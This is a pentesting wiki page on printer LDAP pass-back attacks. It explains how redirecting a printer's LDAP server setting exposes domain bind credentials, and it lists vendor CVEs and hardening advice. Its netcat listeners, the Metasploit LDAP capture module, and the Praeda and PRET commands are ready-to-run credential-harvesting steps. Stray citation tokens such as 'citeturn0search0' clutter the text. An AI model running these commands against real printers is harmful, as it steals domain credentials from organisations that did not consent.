# Information in Printers

{{#include ../../banners/hacktricks-training.md}}

There are several blogs in the Internet which **highlight the dangers of leaving printers configured with LDAP with default/weak** logon credentials.  
This is because an attacker could **trick the printer to authenticate against a rouge LDAP server** (typically a `nc -vv -l -p 444` is enough) and to capture the printer **credentials on clear-text**.

Also, several printers will contain **logs with usernames** or could even be able to **download all usernames** from the Domain Controller.

All this **sensitive information** and the common **lack of security** makes printers very interesting for attackers.

Some blogs about the topic:

- https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/  
- https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856

## Printer Configuration

- **Location**: The LDAP server list is found at: `Network > LDAP Setting > Setting Up LDAP`.
- **Behavior**: The interface allows LDAP server modifications without re-entering credentials, aiming for user convenience but posing security risks.
- **Exploit**: The exploit involves redirecting the LDAP server address to a controlled machine and leveraging the "Test Connection" feature to capture credentials.

## Capturing Credentials

For more detailed steps, refer to the original [source](https://grimhacker.com/2018/03/09/just-a-printer/).

### Method 1: Netcat Listener

A simple netcat listener might suffice:

```bash
sudo nc -k -v -l -p 386
```

However, this method's success varies.

### Method 2: Full LDAP Server with Slapd

A more reliable approach involves setting up a full LDAP server because the printer performs a null bind followed by a query before attempting credential binding.

1. **LDAP Server Setup**: Follow a guide such as Server World for OpenLDAP on a Linux distro.  
2. **Key Steps**:  
   - Install OpenLDAP.  
   - Configure admin password.  
   - Import basic schemas.  
   - Set domain name on LDAP DB.  
   - Configure LDAP TLS.  
3. **LDAP Service Execution**: Once set up, the LDAP service can be run using:

```bash
slapd -d 2
```

### Method 3: Metasploit LDAP Capture

Use Metasploit's auxiliary module to reliably capture LDAP credentials by emulating a server and logging bind attempts:

```bash
sudo msfconsole -q
use auxiliary/server/capture/ldap
set SRVHOST <attacker_ip>
run
```
citeturn0search0

### Method 4: Praeda

Praeda automates harvesting from printers' Embedded Web Server (EWS) and collects credentials, usernames, and email addresses:

```bash
git clone https://github.com/percx/praeda
cd praeda
perl praeda.pl --target <printer_ip> --port 80 --output ./printer-data
```
This tool systematically gathers sensitive information from supported printer models. citeturn4search2

### Method 5: Printer Exploitation Toolkit (PRET)

PRET supports PJL, PCL, and PostScript interactions to extract files, memory, and configuration details:

```bash
git clone https://github.com/RUB-NDS/PRET
cd PRET
pip install colorama pysnmp
python2 pret.py list-users <printer_ip> 9100
```
Use commands like `dump` to extract filesystem contents or `print` to send custom PDL jobs. citeturn0search1

## New Vulnerabilities and Vendor Advisories

- **CVE-2020-9330 (Xerox WorkCentre)**: Certain Xerox WorkCentre MFPs do not require re-validation of LDAP bind credentials when changing the LDAP server address, enabling attackers to redirect authentication and capture clear-text credentials. citeturn1search2
- **CVE-2024-12510 & CVE-2024-12511 (Xerox VersaLink)**: Rapid7 disclosed LDAP and SMB/FTP pass-back vulnerabilities in Xerox VersaLink MFPs that allow credential capture via configuration modifications. citeturn1search4
- **CVE-2025-3078 & CVE-2025-3079 (Canon Pass-Back)**: Canon imageRUNNER ADVANCE, imageRUNNER, imagePRESS, and imageCLASS series affected by SMTP/LDAP pass-back flaws, permitting credential extraction when administrative access is obtained. citeturn1search1turn1search3
- **CVE-2025-6081 (Konica Minolta bizhub)**: Konica Minolta bizhub 227 (GCQ-Y3 and earlier) MFPs vulnerable to LDAP pass-back attacks without requiring password change. citeturn1search0

## Hardening Recommendations

- Enforce LDAP over TLS (LDAPS or StartTLS) to protect simple bind credentials in transit, per RFC 4513. citeturn0search0turn0search1  
- Use dedicated, least-privileged service accounts (MSAs or gMSAs) for printer LDAP binds; avoid using high-privilege domain accounts. Rotate and audit service account credentials regularly. citeturn0search0  
- Change default administrative EWS credentials and disable unused protocols (SMB, FTP) to minimize the attack surface.  
- Segment printer management interfaces into a dedicated VLAN and restrict network access to LDAP/AD servers.  
- Monitor and log LDAP bind attempts and configuration changes from printer IPs; integrate logs into a SIEM for anomaly detection.  
- Apply vendor-supplied firmware updates promptly to remediate known CVEs and follow hardening guides from manufacturers.  

## References

- https://grimhacker.com/2018/03/09/just-a-printer/  
- https://www.rapid7.com/blog/post/cve-2025-6081-konica-minolta-bizhub-pass-back-attack-vulnerability-not-fixed/ citeturn1search0  
- https://www.canon.ca/en/Contact-Support/Product-Advisories/2025-May-19-SMTP-PassbackVulnerabilityRemediation citeturn1search1  
- https://sg.canon/en/support/vulnerability-mitigation-against-smtp-ldap-passback/notice citeturn1search3  
- https://nvd.nist.gov/vuln/detail/CVE-2020-9330 citeturn1search2  
- https://www.darkreading.com/iot/xerox-printer-vulnerabilities-credential-capture citeturn1search4  
- https://github.com/percx/praeda citeturn4search2  
- https://github.com/RUB-NDS/PRET citeturn0search1  
- https://datatracker.ietf.org/doc/html/rfc4513 citeturn0search0turn0search1

{{#include ../../banners/hacktricks-training.md}}
